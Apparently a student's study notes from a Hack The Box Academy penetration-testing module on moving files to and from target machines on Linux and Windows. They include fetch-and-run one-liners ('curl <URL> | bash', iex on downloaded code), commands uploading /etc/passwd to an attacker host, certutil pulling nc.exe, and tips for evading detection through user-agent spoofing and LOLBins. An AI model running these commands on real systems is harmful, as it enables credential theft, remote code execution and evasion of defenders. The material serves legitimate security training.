File Transfer Module Documentation

> **Author:** HTB Academy Student  
> **Module:** File Transfer (Linux, Windows, and Miscellaneous Methods)  
> **Goal:** Master the art of moving files to/from target machines in any environment, while staying stealthy and secure.

---

## 🎯 Core Philosophy

In penetration testing, **file transfer is a survival skill**.  
You will never know which tools are installed on a target. You must be ready to adapt using:

- **Built-in OS tools** (Certutil, BITS, SCP)
- **Programming languages** (Python, PHP, Ruby)
- **Network sockets** (Netcat, `/dev/tcp`)
- **Encryption** (OpenSSL, AES)
- **Living off the land** (LOLBins / GTFOBins)

---

## 1. Linux File Transfer Methods

### ✅ Download Operations

| Method | Command | Best For |
|--------|---------|----------|
| **Base64** (no network) | `cat file \| base64 -w 0; echo`<br>`echo -n '<base64>' \| base64 -d > file` | Copy-pasting small files |
| **wget** | `wget <URL> -O <output>` | Standard HTTP downloads |
| **curl** | `curl -o <output> <URL>` | More flexible than wget |
| **Bash /dev/tcp** | `exec 3<>/dev/tcp/<IP>/<port>`<br>`echo -e "GET /file HTTP/1.1\n\n" >&3`<br>`cat <&3` | No wget/curl, only Bash |
| **SCP** | `scp user@remote:/path/file .` | SSH available |

### ✅ Upload Operations

| Method | Command |
|--------|---------|
| **SCP** | `scp /local/file user@remote:/path/` |
| **Python HTTP Server** (serve from target, download from attack) | `python3 -m http.server 8000`<br>`wget http://<targetIP>:8000/file` |
| **Python uploadserver** (target uploads to attack) | `python3 -m uploadserver 443 --server-certificate server.pem`<br>`curl -X POST https://<attack>/upload -F 'files=@/etc/passwd' --insecure` |

### ✅ Fileless Execution (No Disk Write)

```bash
curl <URL> | bash
wget -qO- <URL> | python3

⚠️ Some payloads (e.g., mkfifo) may still create temporary files.

2. Windows File Transfer Methods
ToolCommandPurpose		
**PowerShell **Invoke-WebRequest	Invoke-WebRequest -Uri <URL> -OutFile <dest>	HTTP/HTTPS download
**PowerShell **Invoke-RestMethod	Same as above	Alternative HTTP client
Certutil	certutil -urlcache -split -f <URL> <dest>	Legacy "wget for Windows" (often flagged)
BITSAdmin	bitsadmin /transfer job /priority foreground <URL> <dest>	Background Intelligent Transfer
PowerShell BITS	Start-BitsTransfer -Source <URL> -Destination <dest>	More modern BITS usage
WinHttpRequest (COM)	$h=New-Object -Com WinHttp.WinHttpRequest.5.1
$h.open('GET','<URL>',$false)
$h.send()
iex $h.ResponseText	Fileless execution via COM
Msxml2.XMLHTTP (COM)	Same as above, using Msxml2.XMLHTTP	Alternative COM object
3. File Transfer with Code (Programming Languages)

When wget, curl, or scp are missing, use the language installed on the target.

🐍 Python
# Download (Python 3)
python3 -c 'import urllib.request; urllib.request.urlretrieve("<URL>", "<output>")'

# Upload (using requests module)
python3 -c 'import requests; requests.post("http://<attack>:8000/upload", files={"files": open("/etc/passwd","rb")})'

svgsvg

🐘 PHP
# Download
php -r '$file = file_get_contents("<URL>"); file_put_contents("<output>", $file);'

# Fileless pipe to bash
php -r '$lines = @file("<URL>"); foreach ($lines as $line) { echo $line; }' | bash

svgsvg

💎 Ruby
ruby -e 'require "net/http"; File.write("<output>", Net::HTTP.get(URI.parse("<URL>")))'

svgsvg

🐪 Perl
perl -e 'use LWP::Simple; getstore("<URL>", "<output>")'

svgsvg

📜 JavaScript (Windows – cscript)

javascript

// wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

svgsvg

cmd

cscript.exe /nologo wget.js <URL> <output>

svgsvg

📜 VBScript (Windows – cscript)

vbscript

' wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

svgsvg

cmd

cscript.exe /nologo wget.vbs <URL> <output>

svgsvg

4. Netcat / Ncat & /dev/tcp
🔹 Traditional Netcat (nc)

Method A – Target listens, attack sends

# Target (listener)
nc -l -p 8000 > received_file

# Attack (sender)
nc -q 0 <target_IP> 8000 < local_file

svgsvg

Method B – Attack listens, target pulls

# Attack (listener)
sudo nc -l -p 443 -q 0 < local_file

# Target (connect & receive)
nc <attack_IP> 443 > received_file

svgsvg

🔹 Ncat (modern replacement)
ModeCommand	
Send-only	ncat --send-only <target> <port> < file
Recv-only	ncat -l -p <port> --recv-only > file

svgsvg

🔹 Bash /dev/tcp (no netcat)

bash

# Attack listens with nc
sudo nc -l -p 443 < file

# Target pulls via /dev/tcp
cat < /dev/tcp/<attack_IP>/443 > received_file

svgsvg

📌 This works only if Bash was compiled with --enable-net-redirections (most modern Bash does).

5. SSH / SCP (Encrypted & Reliable)
ActionCommand	
Enable SSH server	sudo systemctl enable ssh; sudo systemctl start ssh
Download (remote → local)	scp user@remote:/path/file .
Upload (local → remote)	scp /local/file user@remote:/path/
SSH into target	ssh user@remote
6. PowerShell Remoting (WinRM) – Windows to Windows

Ports: 5985 (HTTP) / 5986 (HTTPS)

# Create a session
$Session = New-PSSession -ComputerName DATABASE01

# Copy local file to remote session
Copy-Item -Path C:\local.txt -ToSession $Session -Destination C:\remote.txt

# Copy remote file to local
Copy-Item -Path "C:\remote.txt" -Destination C:\ -FromSession $Session

svgsvg

7. RDP Drive Mounting (Windows)
From Linux (xfreerdp)
xfreerdp /v:<target_IP> /u:<user> /p:'<pass>' /drive:linux,/path/to/local/folder

svgsvg

Then on the target, access \\tsclient\linux to copy files.

From Windows (mstsc.exe)
Open Remote Desktop Connection
Go to Local Resources → More...
Select drives to share
Connect and access \\tsclient\<drive> in the session
8. Web Server Uploads (HTTP/HTTPS)
🔹 Python uploadserver (HTTPS)
# Install & generate cert
sudo python3 -m pip install uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start server
python3 -m uploadserver 443 --server-certificate ~/server.pem

# Upload from target
curl -X POST https://<attack_IP>/upload -F 'files=@/etc/passwd' --insecure

svgsvg

🔹 Nginx with PUT method (more robust)

nginx

# /etc/nginx/sites-available/upload.conf
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}

svgsvg

bash

# Enable site and restart
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx

svgsvg

bash

# Upload using curl
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt

svgsvg

9. Protecting Data with Encryption
🔹 Windows – AES Encryption with PowerShell

powershell

# Download & import script
Import-Module .\Invoke-AESEncryption.ps1

# Encrypt a file
Invoke-AESEncryption -Mode Encrypt -Key "StrongPassword" -Path .\secret.txt

# Decrypt
Invoke-AESEncryption -Mode Decrypt -Key "StrongPassword" -Path .\secret.txt.aes

svgsvg

🔹 Linux – OpenSSL (AES-256)

bash

# Encrypt
openssl enc -aes256 -pbkdf2 -iter 100000 -in plain.txt -out encrypted.enc

# Decrypt
openssl enc -d -aes256 -pbkdf2 -iter 100000 -in encrypted.enc -out plain.txt

svgsvg

🔐 Always use strong, unique passwords per engagement.

10. Living off the Land (LOLBins / GTFOBins)
🔹 Windows – LOLBAS Project
BinaryCommandFunction		
certreq.exe	certreq.exe -Post -config http://<attack>:8000/ C:\file	Upload via HTTP POST
Certutil	certutil -verifyctl -split -f http://<attack>/nc.exe	Download (often flagged)
BITSAdmin	bitsadmin /transfer job /priority foreground <URL> <dest>	Background download
GfxDownloadWrapper.exe (Intel)	GfxDownloadWrapper.exe "http://.../file.exe" "C:\dest.exe"	Whitelisted binary
🔹 Linux – GTFOBins Project
BinaryCommandFunction		
openssl	Server: openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < file
Client: openssl s_client -connect <target>:80 -quiet > file	Encrypted transfer (like netcat with SSL)

📌 Bookmark: LOLBAS & GTFOBins

11. Detection & Evasion
🔎 What Defenders Look For
MethodUser-Agent / Signature	
PowerShell Invoke-WebRequest	WindowsPowerShell/5.1
WinHttpRequest (COM)	WinHttp.WinHttpRequest.5
Msxml2	MSIE 7.0; Trident/7.0
Certutil	Microsoft-CryptoAPI/10.0
BITS	Microsoft BITS/7.8
🕵️ How to Evade Detection

Spoof User-Agent (PowerShell)

powershell

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest <URL> -UserAgent $UserAgent -OutFile <dest>
Use LOLBins (whitelisted, less monitored)
GfxDownloadWrapper.exe, certreq.exe, bitsadmin, etc.
Encrypt your payload (OpenSSL / AES) – even if intercepted, the content is unreadable.
Split large files into chunks to avoid size-based alerts.
📚 Quick Reference Tables
✅ Linux Downloads
ToolCommand	
wget	wget <URL> -O <out>
curl	curl -o <out> <URL>
python3	python3 -c 'import urllib.request; urllib.request.urlretrieve("<URL>", "<out>")'
php	php -r 'file_put_contents("<out>", file_get_contents("<URL>"));'
scp	scp user@remote:/path/file .
/dev/tcp	cat < /dev/tcp/<IP>/<port> > file
✅ Linux Uploads
ToolCommand	
scp	scp /local/file user@remote:/path/
python http.server	target: python3 -m http.server 8000
attack: wget http://<target>:8000/file
curl (to uploadserver)	curl -X POST http://<attack>/upload -F 'files=@/file'
✅ Windows Downloads
ToolCommand	
PowerShell	Invoke-WebRequest -Uri <URL> -OutFile <dest>
Certutil	certutil -urlcache -split -f <URL> <dest>
BITSAdmin	bitsadmin /transfer job /priority foreground <URL> <dest>
cscript (JS/VBS)	cscript.exe /nologo wget.js <URL> <dest>
✅ Windows Uploads
ToolCommand	
certreq.exe	certreq.exe -Post -config http://<attack>:8000/ C:\file
PowerShell (via uploadserver)	Invoke-WebRequest -Uri http://<attack>/upload -Method POST -Form @{files=Get-Item -Path C:\file}
🧠 Key Lessons Learned
Adapt or Die – No single tool works everywhere. Have a Plan B, C, D.
Know Your Languages – Python, PHP, Ruby, Perl, JS, VBS – one of them is always there.
Encrypt Sensitive Data – Use OpenSSL or AES before exfiltration.
Live off the Land – LOLBins/GFTBins are your stealthiest friends.
Evade Detection – Spoof user-agents and use obscure binaries.
Verify Integrity – Always use hashing (md5sum, hasher, etc.) to ensure files weren't corrupted.
✅ What I Practiced in This Module
Downloaded flag.txt from a web root using Python (urllib)
Uploaded a ZIP file via scp to a Linux target
Extracted the ZIP using gunzip -S .zip when unzip and 7z were missing
Ran hasher on the extracted file to get the correct hash
Learned how to use Netcat, /dev/tcp, PowerShell Remoting, and RDP drive mounts
Understood how to encrypt, detect, and evade file transfers
🚀 Next Steps
Practice every method on live labs.
Keep LOLBAS and GTFOBins bookmarked.
Combine encryption with transfer to stay safe.
Review this document whenever you forget a command.

Happy Hacking! 🎯
